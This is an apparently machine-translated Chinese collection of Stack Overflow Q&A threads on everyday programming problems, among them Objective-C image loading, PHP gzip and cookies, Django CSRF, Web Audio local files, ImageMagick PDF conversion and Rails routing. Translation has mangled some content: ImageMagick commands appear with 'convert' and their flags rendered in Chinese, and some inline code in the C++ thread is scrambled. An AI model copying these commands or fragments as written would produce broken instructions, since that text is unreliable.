@implementation Deck

@synthesize cards;

- (id) init
{
    if(self = [super init])
    {
        cards = [[NSMutableArray alloc] init];

        NSInteger aCount, picNum = 0;

        for(int suit = 0; suit < 4; suit++)
        {
            for(int face = 1; face < 14; face++, picNum++)
            {

                NSString *fileName = [NSString stringWithFormat:@"card_%d", picNum];
                NSString *path = [[NSBundle mainBundle] pathForResource:fileName         
                   ofType:@"png"inDirectory:@"/cards"];

                NSLog(@"%@", path);                          //outputs correctly

                UIImage *output = [UIImage imageNamed:path];

                NSLog(@"%@", output);                        //outputs null

                Card *card = [[Card alloc] initWithFaceValue:(NSInteger)face
                                                countValue:(NSInteger)aCount
                                                suit:(Suit)suit
                                                cardImage:(UIImage *)output];

                [cards addObject:card];
            }

        }
    }
    return self;
} 
```

我添加了一个链接来显示图片的位置

[关联](http://pmag.ucsd.edu/~pmag/Screen.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-07T23:34:04.153

您不必包含图像的所有路径，如果您只输入名称，Xcode 会自动查找它。

# php - Gzip 不压缩所有 CSS 和 JS

> ID：14074808
> 
> 赞同：0
> 
> 时间：2012-12-28T19:40:10.453
> 
> 标签：php, performance, compression, gzip

我的托管服务提供商不使用 htaccess 来启用 gzip。他们的支持告诉我将我的 HTML 文件更改为 PHP 并在顶部添加以下内容：

```
<?php ob_start("ob_gzhandler"); ?> 
```

但是，在使用[gzipWTF](http://gzipwtf.com)查明我的网站是否充分利用 gzip 之后，列出了许多资产 - 仅存 3 个 - 没有被 gzip 压缩。

如果愿意，请转到[gzipWTF](http://gzipwtf.com/)并输入我的 URL：“http://justinjwilson.com”。

检查“详细信息”作为选项。为什么我的大部分 JS 和 CSS 文件都没有被 gzip 压缩？一个简单的 PHP 解决方案将是最好的。请记住，我不能使用 htaccess 来启用 gzip。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-28T19:42:16.073

你对单线不走运。将该行添加到 now-PHP HTML 页面的顶部将导致 PHP 处理页面内容的 gzip-ing。但*只有*那一页。它对外部文件没有影响，因为它不会以任何方式处理它们。（单独的文件是来自浏览器的单独的 GET 请求；PHP 对它们一无所知）。

因此，您需要一个允许 PHP 处理所有内容的 gzip 压缩的解决方案。一个相对简单的解决方案是编写一个单独的 PHP 页面来处理*所有*外部文件的传递。类似的东西`/resource.php?r=myscript.js`。这个 php 脚本将`"ob_gzhandler"`在顶部打开，然后简单地*打开*文件，并将其回显。

# java - 终止从 maven 启动的 java 应用程序

> ID：14074810
> 
> 赞同：3
> 
> 时间：2012-12-28T19:40:19.720
> 
> 标签：java, maven, jvm

我使用 exec-maven-plugin 执行 java 应用程序：

```
<plugin>
    <groupId>org.codehaus.mojo</groupId>
    <artifactId>exec-maven-plugin</artifactId>
    <executions>
        <execution>
            <id>upload-res</id>
            <phase>package</phase>
            <goals>
                <goal>exec</goal>
            </goals>
            <configuration>
                <executable>java</executable>
                <arguments>
                                        <argument>${jvmEncoding}</argument>
                                        <argument>${jvmMaxPermSize}</argument>
                    <argument>-classpath</argument>
                    <classpath />
                    <argument>${myClass}</argument>
                </arguments>
            </configuration>
        </execution>
    </executions>
</plugin> 
```

该应用程序可能会运行几分钟，具体取决于 Internet 连接。如果我只是终止：

```
mvn clean install 
```

在启动的应用程序完成之前，它仍然在后台运行。如果 maven 构建被中断，是否可以终止 java 应用程序？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-28T20:21:31.450

困难在于 JVM 是在一个单独的进程中启动的，并且您不能再使用直接在 JVM 内的 Java 代码与它进行通信。您需要某种进程间通信。有两种方法可以做到这一点：1）让您的应用程序在端口上侦听信号，并让它自行终止，或 2）在某处记录进程的 pid，然后发出操作系统 kill 命令。两个都有点丑

最好的方法取决于应用程序是什么。我们在启动 Jetty 进行调试时使用选项 1。一些应用服务器会自动监听终止信号。

# model - Yii模型类中的textarea规则

> ID：14074816
> 
> 赞同：0
> 
> 时间：2012-12-28T19:40:50.587
> 
> 标签：model, yii, xss, validation

我在 Yii 框架中有一个表的 Active Record 模型。并在该表的一个字段的表单中有一个文本区域。

我可以在模型类的规则功能中为其设置什么规则以防止 XSS 攻击？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-29T01:03:43.453

您可以遵循“正常”的 PHP 安全程序来防止 XSS 攻击。但是看看以下关于 Yii 安全的帖子：

*   [http://www.yiiframework.com/wiki/275/how-to-write-secure-yii-applications/](http://www.yiiframework.com/wiki/275/how-to-write-secure-yii-applications/)
*   [http://www.yiiframework.com/wiki/273/yii-security-extended-guide/](http://www.yiiframework.com/wiki/273/yii-security-extended-guide/)
*   [http://www.yiiframework.com/doc/guide/1.1/en/topics.security](http://www.yiiframework.com/doc/guide/1.1/en/topics.security)

# powershell - 是否可以为 PSSession 保持相同的提示？

> ID：14074818
> 
> 赞同：1
> 
> 时间：2012-12-28T19:40:55.323
> 
> 标签：powershell, powershell-remoting

当我`Enter-PSSession`与 Powershell 一起使用时，我会收到一个新提示，例如

`[HOSTNAME]:>`

这很好，但我想知道是否有办法让它不这样做，而只是默认为常规的 Powershell 提示符。

我问的原因是我已经在我的正常提示功能中设置了主机名，所以我的提示最终看起来像

`[HOSTNAME] <PWD> [HOSTNAME]>`

这是不必要的。

有没有办法覆盖这个功能？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-28T21:08:26.113

您可以像这样重新定义远程会话的提示：

```
$session = New-PSSession MyRemoteServer
Invoke-Command -Session $session -ScriptBlock {
    function prompt { your_prompt_here }
}
Enter-PSSession -Session $session 
```

[在此处](https://stackoverflow.com/a/13693090/381149)查找覆盖预提示 [计算机名称] 的提示功能：

# sqlite - 为 windows phone 8 构建 SQLite

> ID：14074821
> 
> 赞同：4
> 
> 时间：2012-12-28T19:41:06.580
> 
> 标签：sqlite, windows-phone-8

SQLite 可用作

> 一个完整的 VSIX 包，其中包含扩展 SDK 和使用 SQLite 使用面向 Windows Phone 8.0 的 Visual Studio 2012 进行应用程序开发所需的所有其他组件。

但是我需要对源代码进行一些修改。Tim Heuer 在他的[博客](http://timheuer.com/blog/archive/2012/06/05/howto-video-using-sqlite-in-metro-style-app.aspx)中描述了如何为 WinRT 构建 sqlite。

我猜的主要部分：

> ```
> Build the DLL:  
>     nmake -f makefile.msc sqlite3.dll FOR_WINRT=1  
>     If building for ARM: 
>         nmake -f makefile.msc sqlite3.dll FOR_WINRT=1 OPTS=/DWINAPI_FAMILY=WINAPI_PARTITION_APP 
> ```

应该指定哪些选项来构建 Windows Phone 8？

**更新：**

我试过了

```
nmake -f makefile.msc sqlite3.dll FOR_WINRT=1 OPTS=-DWINAPI_FAMILY=WINAPI_PARTITION_PHONE 
```

结果：

![安慰](../Images/3fca4dba8c5c08c9e11b93a75efed41d.png)

我也试过

```
 nmake -f makefile.msc sqlite3.dll FOR_WINRT=1 OPTS=-DWINAPI_FAMILY=WINAPI_FAMILY_PHONE_APP 
```

结果： ![安慰](../Images/af185379fb4c759b64c8cc0592adb41a.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-05T17:55:09.473

Sqlite 包括一些要在构建过程中构建和运行的工具，即*在您正在构建的平台上*：`mkkeywordhash.exe`和`lemon.exe`。这些工具应该通过`cl.exe`针对您的构建平台而不是您的目标平台来构建。

`NCC`变量用于指定本地编译器的位置：

```
nmake -f makefile.msc sqlite3.dll <your options> NCC="c:\Program Files\..path-to-native\cl.exe" 
```

可能就够了。如果出现其他问题，请查找并环顾四周以获取更多信息`NCC`。`Makefile.msc`例如，您可能必须设置以下参数：

```
XCOMPILE=1
USE_NATIVE_LIBPATHS=1
NCRTLIBPATH (where are your native CRT libraries?)
NSDKLIBPATH (where are your native SDK libraries?) 
```

# c++ - 如何同时使用三个 HDC

> ID：14074822
> 
> 赞同：3
> 
> 时间：2012-12-28T19:41:06.223
> 
> 标签：c++, winapi

我希望能够将东西打印到两个 hdc，比如`hdcBuf`和`hdcBuf2`. 然后我想到，然后`BitBlt` `hdcBuf`到，这是客户端窗口。这是我现在拥有的代码：`hdcBuf2``BitBlt` `hdcBuf2``hdc`

```
hdc = GetDC(hWnd);

hdcBuf2 = CreateCompatibleDC(hdc);
hbmBackBM2 = CreateCompatibleBitmap(hdc, client.right, client.bottom);
hbmOldBackBM2 = (HBITMAP)SelectObject(hdcBuf2, hbmBackBM2);

hdcBuf = CreateCompatibleDC(hdcBuf2); 
hbmBackBM = CreateCompatibleBitmap(hdcBuf2, client.right, client.bottom);
hbmOldBackBM = (HBITMAP)SelectObject(hdcBuf, hbmBackBM);
Graphics g(hdcBuf);
Graphics g2(hdcBuf2);
//drawing stuff with both g and g2
BitBlt(hdcBuf2,0,0,client.right,client.bottom,hdcBuf,0,0,SRCCOPY);
BitBlt(hdc,0,0,client.right,client.bottom,hdcBuf2,0,0,SRCCOPY); 
```

所有的 HDC 和 HBITMAP 都是全局的，并在 WM_DESTROY 中正确销毁，图形对象是 GDI+

我需要所有这些 hdcs 的原因是我需要在一个对象之上同时打印东西。我有一张平铺地图，在绘制时我会遍历其中的一部分。我需要打印瓷砖和可能位于多个瓷砖上的对象，但瓷砖必须位于对象下方。只有一个 hdcBuf，我需要遍历地图两次才能做到这一点。

现在，我的代码只打印`hdcBuf`瓷砖上的对象的内容。
在此先感谢您的帮助 ：）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-28T19:44:28.723

`BitBlt`用提供的设备上下文覆盖目标设备上下文的内容。（或者更确切地说，由参数定义的区域内的内容）它不会尝试将两个上下文“混合”在一起。因此，在您第一次调用时`BitBlt`，您绘制`hdcBuf`over的内容`hdcBuf2`（破坏其内容），然后绘制`hdcBuf2`over `hdc`（同时破坏其内容）。

您需要遍历地图两次才能执行此操作。请记住，您的示例也有两个循环——它们就在里面`BitBlt`。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-28T20:15:07.473

要将两个源混合在一起，您需要[AlphaBlend](http://msdn.microsoft.com/en-gb/library/windows/desktop/dd183351%28v=vs.85%29.aspx)函数。它的使用与 StretchBlt 非常相似（与 BitBlt 相关，但如果您在源和目标中不使用相同的大小，则可以选择调整大小）。您必须将[BLENDFUNCTION](http://msdn.microsoft.com/en-gb/library/windows/desktop/dd183393%28v=vs.85%29.aspx)作为参数传递给如何混合 - constantalpha 是最简单的方法。

# c# - c#线程声明

> ID：14074824
> 
> 赞同：3
> 
> 时间：2012-12-28T19:41:19.843
> 
> 标签：c#, multithreading, delegates, declaration

我看到以下声明：

```
ThreadStart myThreadDelegate = new ThreadStart(Work.DoWork);
Thread myThread = new Thread(myThreadDelegate);
myThread.Start(); 
```

它们可以简化为以下内容吗？

```
Thread myThread = new Thread(new ThreadStart(Work.DoWork));
myThread.Start(); 
```

如果是，第二种方法叫什么？每种方法的优缺点是什么？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-28T19:44:31.303

它甚至可以简化为：

```
var myThread = new Thread(Work.DoWork);
myThread.Start(); 
```

没有太大区别。在您的第一个示例中，委托实例获得了一个名称，`myThreadDelegate`理论上可以稍后在方法中使用（可能用于其他用途）。

如果一个人更喜欢一个包含多个级别的长表达式，或者多个带有临时变量然后组合的小表达式，这主要是一个品味问题。

在任何情况下，在我看来，使用方法组的隐式转换，就像在 just 中一样`Work.DoWork`，比编写`new ThreadStart(Work.DoWork)`. 请参阅[如何：声明、实例化和使用委托（C# 编程指南）](http://msdn.microsoft.com/en-us/library/ms173176.aspx)中的*C# 2.0 提供了一种更简单的方法来编写前面的声明*。这种更简单的方法正式称为*方法组转换*。

 *有关`var`关键字的信息，请参阅[隐式类型局部变量（C# 编程指南）](http://msdn.microsoft.com/en-us/library/bb384061.aspx)。

当然，您示例中的最终单线将是：

```
(new Thread(Work.DoWork)).Start(); 
```

在这种情况下，您甚至没有获得对新线程（变量）的引用（实例方法`Start()`返回`void`）。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-12-28T19:44:38.150

是的。它不被称为任何东西，没有优点或缺点。您可以使用附加的 C# 语法糖：

```
Thread myThread = new Thread(Work.DoWork);
myThread.Start(); 
```

它会自动推断您要创建一个 ThreadStart 委托对象。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-28T19:44:40.860

当然可以简化为第二种方法。但是，如果在调试期间需要其他对象，它们将不可用。他们不太可能这样做，但值得注意的是，构建更简洁的线条总是有这个缺点。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-12-28T19:45:30.293

是的，它可以。

如果委托仅用于作为对新 Thread() 方法的引用传递，那么可以通过这种方式优化该序列 - 少一个对象声明。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-12-28T20:23:04.917

两者都是一样的。

在第一个示例中，您有，但除了传递给[Thread 构造函数](http://msdn.microsoft.com/en-us/library/xx3ezzs2.aspx)`myThreadDelegate`之外没有其他用途。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-12-28T19:53:51.853

好的，有人提出了这个建议，但随后删除了他/她的答案：

```
Thread myThread = new Thread ( () => Work.Dowork() ); 
```

那东西被称为 lambda 表达式。*

# php - 其他页面上没有 cookie 值

> ID：14074831
> 
> 赞同：0
> 
> 时间：2012-12-28T19:42:09.753
> 
> 标签：php, cookies, session-cookies, setcookie

我发布到的页面具有以下代码，并且正确地回显了 cookie：

```
/* verify.php */

if ($age >= "21"  && $location == "USA" && $cookie == "Y") {

    $value = "1";
    setcookie("age_verified", $value, time()+60*60*24*30);
    header("Location: ../portal.php?cookieset");
}
elseif ($age >= "21" && $location == "USA") {

    session_start();
    $_SESSION['age_verified'] = "1";
    header("Location: ../portal.php?sessionset");   
} 
```

在 portal.php 上，我无法回显 cookie，但如果选择了该选项，会话会显示得很好。

```
/* portal.php */

session_start();
echo $_SESSION["age_verified"]; 
```

结果是“1”

```
/* portal.php */

echo $_COOKIE["age_verified"]; 
```

没有结果

我正在尝试实现类似下面的代码块，但它无法正常工作，因为 cookie 没有回显结果 /* portal.php */ session_start();

```
if($_SESSION['age_verified']!="1"){
    header("Location: index.php?no_session");
}
elseif ($_COOKIE['age_verified']!="1"){
    header("Location: index.php?no_cookie");
}
else{
    echo "";    
} 
```

我错过了什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-28T19:59:17.427

在我看来，这`$_SESSION['age_verified']!="1"||$_COOKIE['age_verified']!="1"`是在检查会话或 cookie 值。Cookie 值更持久，因为它们存储在用户的机器上，而会话值仅持续到浏览会话。它们可能不会同时设置。

实际上，查看您的逻辑`verify.php`是在执行一项操作或另一项操作，而不是两者兼而有之。希望这可以帮助。

# html - 在 Javascript 中为 Web Audio API 使用本地文件

> ID：14074833
> 
> 赞同：27
> 
> 时间：2012-12-28T19:42:15.650
> 
> 标签：html, client-side, web-audio-api

我正在尝试使用 Web Audio API 在我的 iPhone 游戏上播放声音。问题是这个应用程序完全是客户端。我想将我的 mp3 存储在本地文件夹中（并且不受用户输入驱动），因此我不能使用 XMLHttpRequest 来读取数据。我正在研究使用 FileSystem 但 Safari 不支持它。

有没有其他选择？

编辑：感谢以下回复。不幸的是，音频 API 对于游戏来说非常慢。我有这个工作，延迟只是让用户体验无法接受。澄清一下，我需要的是类似 -

```
var request = new XMLHttpRequest();
request.open('GET', 'file:///./../sounds/beep-1.mp3', true);
request.responseType = 'arraybuffer';
request.onload = function() {
    context.decodeAudioData(request.response, function(buffer) {
    dogBarkingBuffer = buffer;
}, onError);
}
request.send(); 
```

但这给了我错误-

XMLHttpRequest 无法加载 file:///sounds/beep-1.mp3。仅 HTTP 支持跨源请求。未捕获的错误：NETWORK_ERR：XMLHttpRequest 异常 101

我了解读取本地文件的安全风险，但在您自己的域内肯定可以吗？

* * *

## 回答 #1

> 赞同：44
> 
> 时间：2013-08-06T14:37:22.267

我有同样的问题，我找到了这个非常简单的解决方案。

```
audio_file.onchange = function(){
  var files = this.files;
  var file = URL.createObjectURL(files[0]); 
              audio_player.src = file; 
  audio_player.play();
};
```

```
<input id="audio_file" type="file" accept="audio/*" />
<audio id="audio_player" />
```

你可以在这里测试：http: [//jsfiddle.net/Tv8Cm/](http://jsfiddle.net/Tv8Cm/)

* * *

## 回答 #2

> 赞同：17
> 
> 时间：2012-12-29T16:05:35.610

好的，我花了两天时间对不同的解决方案进行原型设计，我终于弄清楚了如何在不将资源存储在服务器上的情况下做到这一点。有一些博客对此进行了详细说明，但我无法在一个地方找到完整的解决方案，因此我将其添加到此处。经验丰富的程序员可能会认为这有点 hacky，但这是我看到这个工作的唯一方法，所以如果有人有更优雅的解决方案，我很想听听。

解决方案是将我的声音文件存储为 Base64 编码字符串。声音文件相对较小（小于 30kb），所以我希望性能不会成为太大问题。请注意，我将“xxx”放在一些超链接的前面，因为我的 n00b 状态意味着我不能发布两个以上的链接。

**步骤 1：创建 Base 64 声音字体**

首先，我需要将我的 mp3 转换为 Base64 编码的字符串并将其存储为 JSON。我在这里找到了一个为我进行此转换的网站 - xxxhttp://www.mobilefish.com/services/base64/base64.php 您可能需要使用文本编辑器删除返回字符，但对于任何需要示例的人，我找到了一些这里的钢琴音 - xxxhttps://raw.github.com/mudcube/MIDI.js/master/soundfont/acoustic_grand_piano-mp3.js 请注意，为了使用我的示例，您需要删除标题部分*数据：音频/mpeg;base64,*

**第 2 步：将声音字体解码为 ArrayBuffer**

你可以自己实现它，但我找到了一个完美的 API（为什么要重新发明轮子，对吧？） - [https://github.com/danguer/blog-examples/blob/master/js/base64-binary。 js](https://github.com/danguer/blog-examples/blob/master/js/base64-binary.js) 资源取自 -[这里](http://blog.danguer.com/2011/10/24/base64-binary-decoding-in-javascript/)

**第 3 步：添加其余代码**

非常坦率的

```
var cNote  = acoustic_grand_piano.C2;
var byteArray = Base64Binary.decodeArrayBuffer(cNote); 
var context = new webkitAudioContext();

context.decodeAudioData(byteArray, function(buffer) {
    var source = context.createBufferSource(); // creates a sound source
    source.buffer = buffer;    
    source.connect(context.destination); // connect the source to the context's destination (the speakers)
    source.noteOn(0); 
}, function(err) { console.log("err(decodeAudioData): "+err); }); 
```

就是这样！我通过我的桌面版 Chrome 和移动版 Safari 运行（当然仅限 iOS 6，因为旧版本不支持 Web 音频）。在移动版 Safari 上加载需要几秒钟（在桌面版 Chrome 上加载不到 1 秒），但这可能是因为它需要花费时间下载声音字体。也可能是因为 iOS 在用户交互事件发生之前会阻止任何声音播放。我需要做更多的工作来看看它的表现。

希望这能拯救别人我所经历的悲伤。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-03T00:13:37.970

因为 ios 应用程序是沙盒化的，所以 web 视图（基本上是 safari 包装在 phonegap 中）允许您在本地存储您的 mp3 文件。即，不存在“跨域”安全问题。

这是 ios6 的版本，因为以前的 ios 版本不支持网络音频 api

* * *

## 回答 #4

> 赞同：-2
> 
> 时间：2012-12-28T19:47:28.040

使用[HTML5 Audio 标签](http://www.w3schools.com/html/html5_audio.asp)在浏览器中播放音频文件。

Ajax 请求适用于 http 协议，因此当您尝试使用 file:// 获取音频文件时，浏览器会将此请求标记为跨域请求。在请求标头中设置以下代码 -

```
header('Access-Control-Allow-Origin: *'); 
```

# pdf - 边距在 PDF 中消失 -> 使用 ImageMagick 进行 PNG 转换

> ID：14074840
> 
> 赞同：1
> 
> 时间：2012-12-28T19:42:59.097
> 
> 标签：pdf, imagemagick, png

我在 ImageMagick 中将 PDF 转换为 PNG 时遇到问题。我使用了不同的变体，包括使用 Ghostscript 并将输出通过管道传输到 ImageMagic（如此处给出[的](https://stackoverflow.com/a/3379649/701410)- 这似乎对我不起作用，所以我必须保存到临时文件而不是使用管道）。我发现这对我最有效：

> 转换-背景透明-密度150x150 Test.pdf Test-IMSoloOut.png

这是我的查看器中原始 PDF 的屏幕截图（预览，在 OS X 上）：

![预览中的原始 PDF 文件](../Images/f16aec340c4b7ad8cf5d3b56d7c2e63a.png)

当我转换它时，我得到了这个：

![预览中的 PNG](../Images/a0fc167d20233b8a4a1fa734e688a005.png)

问题是它正在降低利润率。我不清楚是让它们透明还是什么，但图像的格式看起来很草率，没有边距。

我得到了这个尝试：

> 转换 - 密度 150x150 Test.pdf - 重心 - 背景透明 - 范围 612x792 Test-Extras.png

这只是给了我页面的一部分：

![在此处输入图像描述](../Images/ca3d9236e93eebe1aaae8b6b951fcde0.png)

我尝试调整它并将 612x792 更改为 1275x1650，这将适合 150DPI 乘以页面大小（8.5" x 11"）。当我这样做时，我得到了一个大图像，但是，边缘又消失了，就像上面的第二张图像一样。

这些图像将显示在将显示多个页面的 Java 程序中，因此边距可能会有所不同（换句话说，我不能只在输出周围设置边框，如第二张图像所示，因为某些图像的边框大小会发生变化）。

我已经看到许多关于删除 PDF 到 PNG 转换的边距的点击，但它们似乎没有提供任何帮助我的东西。

我的猜测是，在转换过程中，边距被转换为透明的东西，所以我尝试在命令行中添加“-transparent white”进行转换，但没有帮助。

我该怎么做才能恢复边距，或者，如果它们在那里并且不可见，我怎样才能让它们显示？基本上我希望 PNG 文件（图像 #2）看起来像包含边距的 PDF 文件（图像 #1）。

我怀疑我遗漏了一些明显的东西——我希望就这么简单。

如何确保显示边距中的空间？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-29T06:29:37.720

我从来没有得到一个确切的答案，但是 ImageMagick 的一个人对此很有帮助。基本上，我需要使用选项“-extent”来指定图像的大小。由于我使用的密度与默认值不同，因此我也必须考虑到这一点。有效的命令行是：

> 转换 -density 150x150 InputFile.pdf -background white -units PixelsPerInch -density 150 -extent 1275x1650 OutputFile.png

1275x1650 来自将 150（对于 DPI）乘以 8.5" 的宽度和 11 的高度。

# django - Django 1.4 中的 CSRF 保护

> ID：14074844
> 
> 赞同：3
> 
> 时间：2012-12-28T19:43:10.963
> 
> 标签：django, django-csrf

我正在尝试通过“The Django Book”学习 django，但我在 CSRF 保护方面遇到了问题。我在这里找到了很多建议，但似乎没有一个对我有用。

使用 Chrome 我收到消息：`CSRF token missing or incorrect`.
使用 Internet Explorer 我收到消息：`CSRF cookie not set`.

如果我在 settings.py 中注释掉`'django.middleware.csrf.CsrfViewMiddleware'`，一切似乎都可以正常工作（当然，虽然没有任何东西被邮寄到虚假地址。）我已经尝试`csrf_protect`在我的视图上放置一个装饰器，但它没有帮助。我还尝试注释掉对 的调用`send_mail`，但我仍然遇到 CSRF 失败，所以显然是 ContactForm 导致了问题。

（我使用的是 django 1.4.1。）

我需要做什么？

### 视图.py

```
from django.shortcuts import render_to_response
from django.http import HttpResponse, HttpResponseRedirect
from contact.forms import ContactForm
from django.template import RequestContext
from django.core.mail import send_mail

def contact(request):
    if request.method == 'POST':
        form = ContactForm(request.POST)
        if form.is_valid():
            cd = form.cleaned_data
            send_mail(
                cd['subject'],
                cd['message'],
                cd.get('email', 'noreply@example.com'),
                ['siteowner@example.com'],
            )
            return HttpResponseRedirect('/contact/thanks/')
    else:
        form = ContactForm()
    return render_to_response('contact_form.html', {'form': form}, context_instance=RequestContext(request))

def thanks(request):
    return HttpResponse("Thanks for the feedback") 
```

### 表格.py

```
from django import forms

class ContactForm(forms.Form):
    subject = forms.CharField()
    email = forms.EmailField(required=False)
    message = forms.CharField() 
```

### contact_form.html

```
<html>
<head>
    <title>Contact us</title>
</head>
<body>
    <h1>Contact us</h1>

    {% if form.errors %}
        <p style="color: red;">
            Please correct the error{{ form.errors|pluralize }} below.
        </p>
    {% endif %}

    <form action="" method="post">
        <table>
            {{ form.as_table }}
        </table>
        <input type="submit" value="Submit">
    </form>
</body>
</html> 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-28T19:53:49.537

如果您想要 csrf 保护，请将`{% csrf_token %}`标签放入您的表单中。

如果您不想要 csrf 保护，请导入`@csrf_exempt`装饰器并将其放在视图的顶部（请参阅[文档](https://docs.djangoproject.com/en/dev/ref/contrib/csrf/#django.views.decorators.csrf.csrf_exempt)）。

# android - overridePendingTransition(R.anim.fadein,R.anim.fadeout);

> ID：14074851
> 
> 赞同：0
> 
> 时间：2012-12-28T19:43:51.020
> 
> 标签：android

此代码在 startActivity 之后运行，但在以下设置之后：

```
@Override
    public void onCreate(Bundle savedInstanceState){ 
      super.onCreate(savedInstanceState); 
```

保留旧的（默认）android 动画。为什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-28T19:54:50.560

因为当您的活动开始并有机会时`overridePendingTransition`，过渡已经发生。您应该更改 a 中的窗口转换，并在清单中`Theme`设置主题。`Activity`

# ruby-on-rails - ActionController::MethodNotAllowed（只允许获取、放置和删除请求。）

> ID：14074854
> 
> 赞同：0
> 
> 时间：2012-12-28T19:44:11.947
> 
> 标签：ruby-on-rails

当我尝试提交表单时，我收到此错误 ActionController::MethodNotAllowed（仅允许获取、放置和删除请求。）。我的路线是这样的

admin.resources：email_launcher

这是我的form_for，

*   form_for :email_launcher, :url => new_admin_email_launcher_path, :method => :get do |f|

这不是形式，而是新视图，我正在使用 HAML。我整天在谷歌上搜索错误，但从未发现任何有价值的东西。任何帮助都会很棒，谢谢。

这是我的 admin_email_launcher 的 rake 路线

```
 admin_email_launcher_index GET     /admin/email_launcher(.:format)                                                {:controller=>"admin/email_launcher", :action=>"index"}
                                                     POST    /admin/email_launcher(.:format)                                                {:controller=>"admin/email_launcher", :action=>"create"}
                            new_admin_email_launcher GET     /admin/email_launcher/new(.:format)                                            {:controller=>"admin/email_launcher", :action=>"new"}
                           edit_admin_email_launcher GET     /admin/email_launcher/:id/edit(.:format)                                       {:controller=>"admin/email_launcher", :action=>"edit"}
                                                     GET     /admin/email_launcher/:id(.:format)                                            {:controller=>"admin/email_launcher", :action=>"show"}
                                                     PUT     /admin/email_launcher/:id(.:format)                                            {:controller=>"admin/email_launcher", :action=>"update"}
                                                     DELETE  /admin/email_launcher/:id(.:format)                                            {:controller=>"admin/email_launcher", :action=>"destroy"} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-28T20:06:45.457

**路线.rb**

```
namespace :admin do
  resources :email_launcher
end 
```

**管理员/email_launchers_controller.rb**

```
def new
  @email_launcher = EmailLauncher.new
end 
```

**管理员/email_launcher/新**

```
<%= form_for([:admin,@email_launcher]) do |f| %>
  ...
  <%= f.submit %>
<% end -%> 
```

它将发布新的 email_launcher。为什么需要 GET 新操作？您已经在新页面上。

# breeze - 0.80.3/[BreezeController]-错误

> ID：14074856
> 
> 赞同：0
> 
> 时间：2012-12-28T19:44:13.747
> 
> 标签：breeze

刚刚从 0.78.3 版更新到 Breeze 的新 0.80.3 版。有了新版本，我在 Fiddler 中得到了这个：

```
500  localhost:50372  /api/Breeze/Metadata

{"Message":"An error has occurred.",
"ExceptionMessage":"Unable to load one or more of the requested types. Retrieve the LoaderExceptions property for more information.",
"ExceptionType":"System.Reflection.ReflectionTypeLoadException",
"StackTrace":"   at System.Reflection.RuntimeModule.GetTypes(RuntimeModule module)\r\n   at System.Reflection.RuntimeModule.GetTypes()
at System.Reflection.Assembly.GetTypes()
at Breeze.WebApi.BreezeConfig.<get_Instance>b__1(Assembly a)
at System.Linq.Enumerable.<SelectManyIterator>d__14`2.MoveNext()
at System.Linq.Enumerable.WhereEnumerableIterator`1.MoveNext()
at System.Collections.Generic.List`1..ctor(IEnumerable`1 collection)
at System.Linq.Enumerable.ToList[TSource](IEnumerable`1 source)
at Breeze.WebApi.BreezeConfig.get_Instance()
at Breeze.WebApi.JsonFormatter.Create()
at Breeze.WebApi.BreezeControllerAttribute..cctor()"
} 
```

我之前有 [BreezeController] 属性。问题似乎是 JSON 序列化程序。仅使用 [ODataActionFilter] 我就得到了元数据，但这还不够。

我阅读了文档，但我认为我没有错过任何更改。使用 0.78.3 的备份它再次工作。这里有什么想法吗？并且：“检索 LoaderExceptions 属性”。我怎么得到这些？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-29T02:51:46.080

这是一个错误，已在 v 0.80.5 中修复。请让我们知道任何问题。

# php - 获取文章以通过 id 在 mysql 表中更新？

> ID：14074861
> 
> 赞同：1
> 
> 时间：2012-12-28T19:44:22.390
> 
> 标签：php, mysql

我的网站上有一个评论系统，用户可以在其中评价其他用户。当用户登录时，他们可以转到待处理的评论部分，在那里他们可以批准或删除评论。

我从 ptb_reviews 表中提取评论并在页面 review.php 上列出它们。然后，每个评论都有一个批准或删除链接，该链接指向approve_review.php 或delete_review.php，其中有SQL 函数可以在我的表中设置相关列，因此批准或删除，从0 到1。

因此，如果用户批准评论，它会将表中的批准更新为 1，其中已选择批准特定评论，然后删除相同的评论。

我遇到了一个问题，当我尝试批准或删除评论时，我回显查询以测试它以查看正在发生的事情并查看它是否按照我的要求做，我得到了这个：

```
UPDATE ptb_reviews SET approved = 1 WHERE id = '' LIMIT 1 
```

这意味着它无法找到评论 ID，因此不会将更新应用于表中适用于该评论的 1。

这是我的reviews.php代码，其中评论被拉出：

```
<?php
        $reviews_set = get_new_reviews();
        while ($reviews = mysql_fetch_array($reviews_set)) {

            $review_id = (int) $_GET['review_id']; 
    // Just this, is a great security enhancement. Forces the variable to be int (like all id's are). 
    // You can also check if its a numeric by doing
if (is_numeric($review_id)){
    // continue with the update query
} else {
    // something fishy is going on..
}

?>

        <div class="prof-content-pend-reviews" id="reviews">
             <div class="pend-review-content">
             <?php echo "{$reviews['content']}"; ?>
             </div>
             <div class="message_pic">
             <?php echo "<a href=\"profile.php?id={$reviews['from_user_id']}\"><img width=\"50px\" height=\"50px\" src=\"data/photos/{$reviews['from_user_id']}/_default.jpg\" /></a>";?>

             </div>

             <div class="forum-text">
             <?php echo "Posted by {$reviews['display_name']}"; ?> <?php echo "".$age." days ago"; ?>
          </div>

          <a href="includes/approve_review.php?review=<?php echo $reviews['review_id']; ?>"><div class="approve"></div></a>
           <a href="includes/delete_review.php"><div class="delete"></div></a>

             </div>

